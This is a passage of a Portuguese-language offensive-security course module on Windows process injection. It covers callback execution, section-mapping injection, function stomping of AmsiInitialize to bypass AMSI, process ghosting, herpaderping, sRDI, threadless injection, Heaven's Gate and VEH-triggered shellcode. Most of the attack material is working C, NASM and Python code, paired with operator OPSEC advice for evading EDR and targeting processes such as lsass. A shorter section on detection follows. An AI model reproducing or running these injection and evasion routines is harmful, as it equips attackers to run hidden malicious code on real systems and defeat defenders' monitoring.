BOOL CALLBACK __stdcall PayloadCallback(HWND hWnd, LPARAM lParam) {
    // Aqui executa o payload (o "shellcode" foi castado para esse tipo)
    return TRUE;
}

int main() {
    PVOID pAddress = VirtualAlloc(NULL, sizeof(Payload),
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(pAddress, Payload, sizeof(Payload));

    DWORD dwOldProtect;
    VirtualProtect(pAddress, sizeof(Payload), PAGE_EXECUTE_READWRITE, &dwOldProtect);

    // Disparar payload via callback API
    EnumDesktopWindows(NULL, (WNDENUMPROC)pAddress, NULL);

    return 0;
}
```

**Por que funciona**: `EnumDesktopWindows` chama internamente a callback para cada window do desktop. O shellcode é executado no contexto da thread atual, sem `CreateThread`. Stack analysis mostra chamada de `user32!EnumDesktopWindows` → callback — fluxo de API legítima.

**OPSEC**: thread stack walk pode parar em `user32.dll` em vez de em alloc anônima → menos suspeito. Combinar com Module Stomping para alocar payload em região de DLL legítima.

---

### 11. Mapping Injection (Section Objects)

Em vez de `VirtualAlloc[Ex]` + `WriteProcessMemory` (clássico fluxo hookado), usar **Section Objects** (memória compartilhada entre processos). Bypass de `WriteProcessMemory` hooks via mapeamento direto.

**APIs (todas em ntdll, syscalls)**:
- `NtCreateSection` — cria section object
- `NtMapViewOfSection` — mapeia view do section em qualquer processo

**Vantagem chave**: escrita do payload no processo remoto **não** passa por `WriteProcessMemory`. EDRs que hookam `WriteProcessMemory` perdem a visibilidade.

#### Local Mapping Injection

```c
typedef NTSTATUS (NTAPI* fnNtCreateSection)(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle
);

typedef NTSTATUS (NTAPI* fnNtMapViewOfSection)(
    HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress,
    ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect
);

BOOL InjectViaMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    fnNtCreateSection    pNtCreateSection    = (fnNtCreateSection)
        GetProcAddress(hNtdll, "NtCreateSection");
    fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)
        GetProcAddress(hNtdll, "NtMapViewOfSection");

    HANDLE hSection = NULL;
    LARGE_INTEGER liSectionSize = { .QuadPart = sPayloadSize };

    // 1. Criar section
    if (pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &liSectionSize,
                        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != 0) {
        return FALSE;
    }

    // 2. Mapear view RW para escrita
    PVOID pLocalView = NULL;
    SIZE_T sViewSize = 0;
    if (pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, 0, 0, NULL,
                            &sViewSize, 2 /* ViewUnmap */, 0, PAGE_READWRITE) != 0) {
        CloseHandle(hSection);
        return FALSE;
    }

    // 3. Copiar payload — escrita em memória compartilhada, sem WriteProcessMemory
    memcpy(pLocalView, pPayload, sPayloadSize);

    // 4. Mapear view RX para execução
    PVOID pExecView = NULL;
    SIZE_T sExecSize = 0;
    if (pNtMapViewOfSection(hSection, GetCurrentProcess(), &pExecView, 0, 0, NULL,
                            &sExecSize, 2, 0, PAGE_EXECUTE_READ) != 0) {
        return FALSE;
    }

    // 5. Executar via thread ou call direto
    ((void(*)())pExecView)();

    return TRUE;
}
```

#### Remote Mapping Injection

Mesma técnica, mas mapeia view RX no processo remoto:

```c
BOOL InjectViaMappingRemote(IN HANDLE hRemoteProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    fnNtCreateSection    pNtCreateSection    = (fnNtCreateSection)
        GetProcAddress(hNtdll, "NtCreateSection");
    fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)
        GetProcAddress(hNtdll, "NtMapViewOfSection");

    HANDLE hSection = NULL;
    LARGE_INTEGER liSize = { .QuadPart = sPayloadSize };

    if (pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &liSize,
                        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != 0) return FALSE;

    // Mapear localmente para escrever payload
    PVOID pLocalView = NULL;
    SIZE_T sLocalSize = 0;
    pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, 0, 0, NULL,
                       &sLocalSize, 2, 0, PAGE_READWRITE);
    memcpy(pLocalView, pPayload, sPayloadSize);

    // Mapear no processo remoto com permissão RX
    PVOID pRemoteView = NULL;
    SIZE_T sRemoteSize = 0;
    pNtMapViewOfSection(hSection, hRemoteProcess, &pRemoteView, 0, 0, NULL,
                       &sRemoteSize, 2, 0, PAGE_EXECUTE_READ);

    // Trigger via CreateRemoteThread / Thread Hijacking / APC
    HANDLE hThread = CreateRemoteThread(hRemoteProcess, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)pRemoteView,
                                         NULL, 0, NULL);

    return hThread != NULL;
}
```

**OPSEC**: bypassa hooks em `WriteProcessMemory`. Porém alguns EDRs também hookam `NtMapViewOfSection`. **Indirect syscall** (técnica adicional) bypassa esses hooks completamente.

---

### 12. Function Stomping Injection

**Conceito**: ao invés de alocar memória nova (que aparece como `MEM_PRIVATE` em scan), **sobrescrever uma função exportada de uma DLL** carregada no processo. Aparência: alteração in-place de DLL legítima. Detecção exige hash check da DLL na memória vs disco.

**Pré-requisitos**:
- DLL escolhida deve estar carregada no processo (`GetModuleHandle`)
- Função alvo deve ser **grande o suficiente** para acomodar o payload
- Função alvo **não pode ser usada** pelo processo (senão crash quando chamada)

**Trade-off vs Module Stomping**:
- Module Stomping (técnica 5) — overwrite da DLL inteira (mais espaço, mais visível em hash check)
- Function Stomping — overwrite apenas de uma função pequena (menos visível, espaço limitado)

#### Local Function Stomping

```c
BOOL FunctionStomp(IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    // Escolher função "morta" — exportada mas raramente chamada
    HMODULE hMod = LoadLibraryA("amsi.dll");          // ou outra DLL
    if (!hMod) return FALSE;

    LPVOID pTargetFunc = GetProcAddress(hMod, "AmsiInitialize");
    if (!pTargetFunc) return FALSE;

    DWORD dwOldProtect = 0;

    // Mudar proteção da página da função para RWX
    if (!VirtualProtect(pTargetFunc, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        return FALSE;
    }

    // Sobrescrever bytes da função com payload
    memcpy(pTargetFunc, pPayload, sPayloadSize);

    // Restaurar proteção original (opcional, para evasão)
    DWORD dwTmp;
    VirtualProtect(pTargetFunc, sPayloadSize, dwOldProtect, &dwTmp);

    // Executar via call direto (já que substitui a função, basta chamá-la)
    ((void(*)())pTargetFunc)();

    return TRUE;
}
```

**Vantagem subliminar**: chamada direta para função do `amsi.dll` em vez de pulo para alloc anônima → stack/call analysis mostra fluxo "normal".

**Combinação devastadora — AmsiInitialize stomp**:
- Sobrescreve `AmsiInitialize` com shellcode
- Próxima carga de PowerShell tenta chamar `AmsiInitialize` → executa shellcode em vez de init AMSI
- **Bypass AMSI + execução payload em uma operação**

#### Remote Function Stomping

```c
BOOL FunctionStompRemote(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    HMODULE hMod = LoadLibraryA("amsi.dll");
    LPVOID pTargetFunc = GetProcAddress(hMod, "AmsiInitialize");

    // O endereço de amsi.dll é o mesmo em todos processos (KnownDLL caching)
    // — não precisa enumerar módulos do processo remoto

    DWORD dwOldProtect = 0;
    if (!VirtualProtectEx(hProcess, pTargetFunc, sPayloadSize,
                          PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        return FALSE;
    }

    SIZE_T sBytesWritten = 0;
    if (!WriteProcessMemory(hProcess, pTargetFunc, pPayload, sPayloadSize, &sBytesWritten)) {
        return FALSE;
    }

    // Restaurar proteção
    DWORD dwTmp;
    VirtualProtectEx(hProcess, pTargetFunc, sPayloadSize, dwOldProtect, &dwTmp);

    // Trigger — criar thread apontando para função sobrescrita
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)pTargetFunc,
                                         NULL, 0, NULL);
    return hThread != NULL;
}
```

**Detecção**: hash de amsi.dll em memória vs disco diverge na função sobrescrita. Forrest Orr's Moneta detecta este padrão.

---

### 13. Ghost Process Injection (Process Ghosting)

**Origem**: hasherezade/process_ghosting (POC público GitHub).

**Mecânica**: criar processo a partir de **section object** cujo arquivo backing já foi marcado para deleção. Resultado: processo executa payload, mas Process Hacker/EDR mostra processo "sem nome" (FileObject inválido). Image filename do EPROCESS aponta para arquivo que não existe mais.

**Diferença vs Process Hollowing**:
- Hollowing usa `CreateProcessW(SUSPENDED)` + `NtUnmapViewOfSection` + `WriteProcessMemory` (image legítima inicial, depois sobrescrita).
- Ghosting **nunca** cria processo a partir de imagem legítima — section é criada direto do arquivo já em delete-pending.

**Fluxo (8 passos)**:

1. Ler PE payload (mimikatz, beacon, etc.) para buffer.
2. `CreateFileW` em `%TEMP%\<rand>.tmp` com `FILE_FLAG_DELETE_ON_CLOSE` + `DELETE` access.
3. `SetFileInformationByHandle` com `FileDispositionInfo` para marcar delete-pending.
4. `WriteFile` payload no `.tmp`.
5. `NtCreateSection(SEC_IMAGE, hFile)` — cria section **a partir do handle ainda aberto**.
6. `CloseHandle(hFile)` — arquivo deletado fisicamente do disco; section persiste em memória.
7. `NtCreateProcessEx(hSection, ...)` — cria processo "ghost".
8. Escrever PEB ProcessParameters manualmente, criar thread no EntryPoint.

**Código de referência** (API chain mínima, demonstração):

```c
// Headers
typedef NTSTATUS (NTAPI *NtCreateSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *NtCreateProcessEx_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, BOOLEAN);

BOOL GhostProcess(PBYTE pPayload, DWORD dwSize) {
    WCHAR szTmp[MAX_PATH], szFile[MAX_PATH];
    GetTempPathW(MAX_PATH, szTmp);
    GetTempFileNameW(szTmp, L"gh", 0, szFile);

    // Abrir com DELETE access + DELETE_ON_CLOSE
    HANDLE hFile = CreateFileW(szFile, GENERIC_WRITE | DELETE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);

    // Forçar delete-pending
    FILE_DISPOSITION_INFO fdi = { TRUE };
    SetFileInformationByHandle(hFile, FileDispositionInfo, &fdi, sizeof(fdi));

    // Escrever payload
    DWORD dwW; WriteFile(hFile, pPayload, dwSize, &dwW, NULL);

    // Criar section a partir do arquivo delete-pending
    HANDLE hSection = NULL;
    NtCreateSection_t pNtCreateSection = (NtCreateSection_t)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection");
    pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
                     PAGE_READONLY, SEC_IMAGE, hFile);

    CloseHandle(hFile);  // Deleta arquivo físico; section sobrevive

    // Criar processo a partir da section
    HANDLE hProc = NULL;
    NtCreateProcessEx_t pNtCreateProcessEx = (NtCreateProcessEx_t)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateProcessEx");
    pNtCreateProcessEx(&hProc, PROCESS_ALL_ACCESS, NULL,
                       GetCurrentProcess(), 4 /* PS_INHERIT_HANDLES */,
                       hSection, NULL, NULL, FALSE);

    // [...] Escrever RTL_USER_PROCESS_PARAMETERS no PEB do alvo
    // [...] NtCreateThreadEx no EntryPoint do payload
    return TRUE;
}
```

**OPSEC**:
- Image filename vazio = forte indicador.
- Defender Antimalware Scan Interface escaneia `WriteFile` antes da section ser criada — payload precisa estar criptografado.
- ETW `Microsoft-Windows-Kernel-File` registra a deleção pendente.

---

### 14. Herpaderping

**Origem**: jxy-s/herpaderping (POC público).

**Mecânica**: similar a Ghosting, mas após criar section a partir do payload, **sobrescreve o arquivo em disco com PE legítimo**. Resultado: section em memória = payload malicioso; arquivo em disco = binário benigno (ex: explorer.exe). EDR que escaneia arquivo após criação do processo verá binário limpo.

**Fluxo (8 passos)**:

1. Ler payload.
2. Criar `.tmp` com `GENERIC_WRITE | DELETE` access.
3. Escrever payload no `.tmp`.
4. `NtCreateSection(SEC_IMAGE, hFile)` com payload atual.
5. `NtCreateProcessEx` com section.
6. **Sobrescrever** arquivo com PE legítimo (sem fechar handle) — `SetFilePointer(0)` + `WriteFile(legit_pe)`.
7. Escrever ProcessParameters.
8. Criar thread no EntryPoint.

**Diferencial vs Ghosting**:
- Ghosting: arquivo deletado.
- Herpaderping: arquivo permanece em disco com conteúdo **benigno** (camuflagem).

**Trecho-chave** (overwrite após section):

```c
// Section já criada a partir do payload
// Agora reescrever o arquivo com PE benigno (ex: hostsvc.exe limpo)
SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
WriteFile(hFile, pCleanPE, dwCleanSize, &dwW, NULL);
FlushFileBuffers(hFile);
CloseHandle(hFile);  // Arquivo agora limpo em disco
```

**Detecção**:
- Discrepância hash(image_in_memory) vs hash(image_on_disk). Sysmon Event 1 + EDR memory scan combina.
- Section `SEC_IMAGE` criada antes do processo + write subsequente no mesmo `FileObject`.

---

### 15. Herpaderply Hollowing

**Combo**: Herpaderping + Process Hollowing.

**Fluxo**:
1. Criar processo **legítimo suspenso** (CreateProcess explorer.exe SUSPENDED).
2. Sobrescrever arquivo do processo legítimo com payload.
3. Criar section do arquivo (agora payload).
4. Hollow o processo legítimo com a section nova.
5. Sobrescrever arquivo de volta com PE legítimo.
6. Resumir thread.

Combina disguise de Herpaderping com benefícios de Hollowing (não cria processo "ghost" sem nome).

---

### 16. Shellcode Reflective DLL Injection (sRDI)

**Origem**: monoxgas/sRDI.

**Mecânica**: converter DLL em **shellcode position-independent** prefixando bootstrap stub que faz parse manual do PE + relocations + IAT resolution. Diferença vs RDI clássica:
- RDI: requer loader que calcula endereço de `ReflectiveFunction` exportada.
- sRDI: DLL já vem com bootstrap prepended → carrega via qualquer shellcode runner.

**Camadas do payload final**:
```
[ bootstrap shellcode (~6KB) ][ DLL PE bytes ][ user data opcional ]
```

**Bootstrap responsabilidades**:
1. Resolver `ntdll.dll` exports via PEB walk (sem `LoadLibrary`).
2. `VirtualAlloc` RWX.
3. Copiar headers + sections para alocação.
4. Aplicar base relocations (`IMAGE_REL_BASED_DIR64`).
5. Resolver IAT via `LdrGetProcedureAddress`.
6. Chamar `DllMain(hDll, DLL_PROCESS_ATTACH, lpUserData)`.

**Requisitos de compilação** (críticos):
- `/GS-` (no security cookie — referência global).
- `/Od` ou `/Oy-` (no optimization — não inline funções do bootstrap).
- `/Gy` (function-level linking — facilita extração).
- `MD` ou `MT` consistente.
- **Não usar globais não-const** — referências relativas viram absolutas pós-link.
- **Não usar CRT** — `memcpy` etc. via `__movsb`/`__stosb` intrinsics.

**Conversion tool** (Python wrapper que extrai bootstrap + concatena com DLL):

```python
# sRDI conversion pipeline
def srdi_convert(dll_bytes, user_data, function_hash, flags):
    bootstrap = extract_bootstrap_from_loader_dll()  # do helper compilado
    # Payload: [bootstrap][dll][userdata]
    return bootstrap + struct.pack("<II", function_hash, flags) + dll_bytes + user_data
```

**Uso no operador**:
```c
// Compile DLL benign-looking → run sRDI conversion → result = .bin shellcode
// Carregar em remote process via qualquer técnica (CreateRemoteThread, APC, etc.)
LPVOID pAlloc = VirtualAllocEx(hProc, NULL, sShellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, pAlloc, pShellcode, sShellcode, NULL);
CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pAlloc, NULL, 0, NULL);
```

**Vantagem operacional**: BOFs e .NET assemblies passam por loaders similares. Cobalt Strike, Sliver, Havoc usam sRDI internamente.

---

### 17. Threadless Injection

**Origem**: CCob/ThreadlessInject.

**Mecânica**: substituto stealth para Function Stomping. Em vez de **sobrescrever função inteira** com payload, instala **trampolim de 5-byte `call rel32`** no início de função alvo, redirecionando execução para shellcode posicionado em **"memory hole"** adjacente.

**Memory Hole**: gap não alocado entre DLLs carregadas (ex: 144KB entre `gdi32full.dll` e `msvcp_win.dll`). Requer ser **±2GB** da função hookada porque `call rel32` aceita só offset de 32 bits.

**Vantagens**:
- Não cria thread (`CreateRemoteThread` é trigger forte para EDR).
- Não chama `VirtualAllocEx` (alocação direta no hole via `NtAllocateVirtualMemory` parece menos suspeita).
- Função hookada **continua funcionando** — fixed stub anti-trampoline restaura bytes originais após payload executar.

**Fluxo (5 passos)**:

1. **Find memory hole**: iterar com `NtAllocateVirtualMemory` em endereços alinhados a `0x10000` entre `target_func - 0x70000000` e `target_func + 0x70000000` até `STATUS_SUCCESS` (hole encontrado).
2. **Build shellcode final**: `[fixed unhook stub][user payload]`. Fixed stub guarda registradores, calcula endereço do trampoline original, restaura bytes, executa user payload, restora registradores, retorna controle.
3. **Patch trampolim**: 5 bytes `E8 XX XX XX XX` (`call rel32`) no início da função alvo. Offset calculado = `(memory_hole - func_addr) - 5`.
4. **Trigger**: invocar a função alvo via fluxo normal do processo. Não precisa criar thread.
5. **Cleanup automático**: stub restaura bytes originais antes de retornar.

**Função alvo típica**: `WaitForSingleObjectEx` em `KERNELBASE.dll` (chamada constantemente). Após trampolim, payload executa em **contexto de thread legítima** sem `CreateRemoteThread`.

**Trecho de install**:

```c
BYTE trampoline[5] = { 0xE8, 0x00, 0x00, 0x00, 0x00 };
DWORD rel32 = (DWORD)((ULONG_PTR)pMemoryHole - (ULONG_PTR)pTargetFunc - 5);
memcpy(&trampoline[1], &rel32, 4);

DWORD dwOld;
VirtualProtectEx(hProc, pTargetFunc, 5, PAGE_EXECUTE_READWRITE, &dwOld);
WriteProcessMemory(hProc, pTargetFunc, trampoline, 5, NULL);
VirtualProtectEx(hProc, pTargetFunc, 5, dwOld, &dwOld);
```

**OPSEC**:
- Não cria thread → bypassa Sysmon Event 8.
- Memory hole alocação ainda gera `VirtualAlloc` ETW event (mas sem flag suspeita).
- Função patchada detectável por memory scan (Moneta, pe-sieve).

---

### 18. Cross-Architecture Injection (x86 → x64, Heaven's Gate)

**Mecânica**: processo 32-bit (WoW64) injetar em processo 64-bit nativo. Problema: APIs WoW64 (`Wow64*`) operam só em 32-bit address space; precisa transitar para 64-bit mode → "Heaven's Gate".

**Heaven's Gate**: troca segmento de código via `far jmp`:
- `CS = 0x23` = WoW64 32-bit mode.
- `CS = 0x33` = 64-bit native mode.

Far jump `jmp 0x33:offset` muda CPU para 64-bit; ao retornar, `jmp 0x23:offset` volta para 32-bit.

**Identificar WoW64**:
```c
#define ProcessWow64Information 26
PVOID pWow64Peb = NULL;
NtQueryInformationProcess(hProc, ProcessWow64Information, &pWow64Peb, sizeof(PVOID), NULL);
// pWow64Peb != NULL → processo está em WoW64
```

**Execute64 stub** (Metasploit-derived, NASM):

```nasm
[BITS 32]
WOW64_SEG  EQU 0x23
X64_SEG    EQU 0x33

start:
    push X64_SEG
    call $+5
    add  dword [esp], 5
    retf                      ; Far jump → modo x64

[BITS 64]
    ; Aqui em modo 64-bit; pode chamar NtCreateThreadEx etc.
    ; ...
    ; Retorno: far jmp X64_SEG → WOW64_SEG
```

**Fluxo de injeção cross-arch**:

1. Processo WoW64 (32-bit) abre handle para processo x64.
2. Via Heaven's Gate, executa `NtAllocateVirtualMemory` 64-bit no alvo.
3. `NtWriteVirtualMemory` 64-bit para escrever payload.
4. `NtCreateThreadEx` 64-bit para trigger.

**Por que importa**: muitos initial access vectors (browser, Office macros) executam em processo WoW64. Permite injetar em alvos x64 (lsass.exe, etc.) sem migrar processo do operador.

**Alternativa**: usar `Wow64SystemServiceCall` direto sem far jmp (mais novo, menos detectável que CS swap clássico).

---

### 19. VEH Manipulation for Code Execution

**Mecânica**: Vectored Exception Handler (VEH) é callback registrado via `AddVectoredExceptionHandler` chamado **antes** dos SEH handlers da thread. Quando exceção ocorre (ex: AV, INT3 breakpoint, page fault), Windows invoca cadeia VEH na ordem registrada.

**Abuso**:
1. Registrar VEH apontando para função própria (ou para shellcode).
2. Trigger exceção controlada (acesso a página guard, INT3 hardcoded).
3. VEH handler chamado → executa código sem `CreateThread`/`QueueUserAPC`.

**Use cases**:
- **Anti-debug**: VEH intercepta INT3 antes do debugger.
- **Stealth execution**: AVrf-style trigger via page protection mudança.
- **Hardware breakpoint hooking**: VEH como handler para `EXCEPTION_SINGLE_STEP`.

**Código**:

```c
LONG WINAPI ShellcodeHandler(PEXCEPTION_POINTERS pInfo) {
    if (pInfo->ExceptionRecord->ExceptionCode == EXCEPTION_GUARD_PAGE) {
        // RIP aponta para shellcode; basta deixar fluir
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void TriggerViaVEH() {
    // Alocar página com PAGE_GUARD
    LPVOID pShell = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READ | PAGE_GUARD);
    memcpy(pShell, Payload, sizeof(Payload));

    AddVectoredExceptionHandler(1, ShellcodeHandler);

    // Trigger: primeira execução dispara EXCEPTION_GUARD_PAGE
    ((void(*)())pShell)();
}
```

**Variante avançada — Hardware Breakpoint Trigger**:

```c
// Setar DR0 para endereço alvo + DR7 enable
CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
GetThreadContext(GetCurrentThread(), &ctx);
ctx.Dr0 = (DWORD64)pTargetAddr;
ctx.Dr7 = 0x1;  // Enable L0, execute
SetThreadContext(GetCurrentThread(), &ctx);

// VEH dispara em EXCEPTION_SINGLE_STEP quando RIP == DR0
```

**OPSEC**:
- VEH registry visível em PEB (`ProcessHeap->VEH_List`).
- AddVectoredExceptionHandler chamada hookável por EDR.
- Combina muito bem com sleep obfuscation: trigger sleep wake via VEH em vez de timer callback.

---

## Detecção e OPSEC

### Por Técnica

**DLL Injection Clássica:**
- Sigma rule: `CreateRemoteThread` com target address em `kernel32.LoadLibraryA`
- Artefato em disco: arquivo DLL suspeito em path não-padrão
- Sysmon Event ID 8 (CreateRemoteThread)

**Reflective DLL Injection:**
- Memória `MEM_PRIVATE` executável sem módulo correspondente
- Thread start address em região não-imagem
- Sysmon Event ID 8 + memória anômala

**Process Hollowing:**
- PE em memória diferente do PE em disco (hash mismatch)
- `PEB.ImageBaseAddress` diferente do esperado para o binário
- Hollows Hunter detecta especificamente isso
- Sysmon Event ID 1 (Process Create) + análise de memória

**Early Bird APC:**
- Processo criado com `CREATE_SUSPENDED` seguido de `QueueUserAPC` + `ResumeThread`
- Sysmon Event ID 1 com parent suspeito
- Mais difícil de detectar que CreateRemoteThread pois usa thread legítima

**Module Stomping:**
- Hash da DLL em memória diferente do arquivo em disco
- Moneta, Malin detectam isso comparando módulos carregados com arquivos em disco
- O mais difícil de detectar passivamente

**PPID Spoofing:**
- Parent PID no kernel é diferente do parent PID reportado pelo Win32
- Ferramentas que verificam apenas Win32 PPID são enganadas
- ETW (Event Tracing for Windows) revela o parent real em alguns casos

### OPSEC Consolidado

```
[ ] Usar a tecnica menos suspeita para o contexto operacional
[ ] Combinar tecnicas: PPID Spoofing + Early Bird APC e melhor que DLL Injection classica
[ ] Preferir shellcode PIC a DLL quando possivel (sem artefato em disco)
[ ] Module Stomping quando precisar de memoria com aparencia de MEM_IMAGE
[ ] Verificar se o processo alvo tem comportamento consistente com o shellcode
    (um processo de impressão fazendo conexões HTTPS = suspeito)
[ ] Limpar artefatos: remover arquivos temporarios, fechar handles desnecessarios
[ ] Testar tecnicas escolhidas contra o EDR do ambiente alvo antes da operacao real
```

---

## Módulos Relacionados

`01_process_injection_fundamentos.md` cobre conceitos de memória, handles, privilégios e o flow clássico de VirtualAllocEx. `03_post_exploitation_evasion_bof.md` aprofunda Fork & Run, BOFs, execute-assembly, técnicas in-process. `05_pe_format_e_parsing.md` é base pra Reflective DLL Injection. MITRE ATT&CK: T1055.001 (DLL Injection), T1055.012 (Process Hollowing), T1055.004 (APC Injection), T1134.004 (Parent PID Spoofing).

---

## Leitura Complementar

- ReflectiveDLLInjection (Stephen Fewer) — https://github.com/stephenfewer/ReflectiveDLLInjection
- Hollows Hunter — https://github.com/hasherezade/hollows_hunter
- Moneta — https://github.com/forrest-orr/moneta
- Forrest Orr — "Masking Malicious Memory Artifacts"
- TheWover — "Module Stomping for Shellcode Injection"
- Sysmon Event IDs relevantes: 1, 8, 10, 17, 18
